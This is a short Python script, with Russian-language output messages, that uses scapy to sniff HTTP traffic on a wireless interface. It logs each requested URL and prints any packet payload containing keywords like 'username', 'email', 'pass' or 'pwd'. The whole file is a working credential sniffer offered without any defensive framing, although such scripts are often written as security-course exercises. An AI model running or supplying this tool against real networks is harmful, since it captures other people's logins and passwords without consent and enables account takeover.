#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords_list = ["username", "name", "user", "usr", "email", "mail", "login", "password", "pass", "pwd", "passwd"]
        keywords = [x.encode() for x in keywords_list]
        for keyword in keywords:
            if keyword in load:
                return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] Выполнен HTTP запрос >> " + str(url))

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Возможно обнаружен login/password >> " + str(login_info) + "\n\n")

sniff("wlan0")
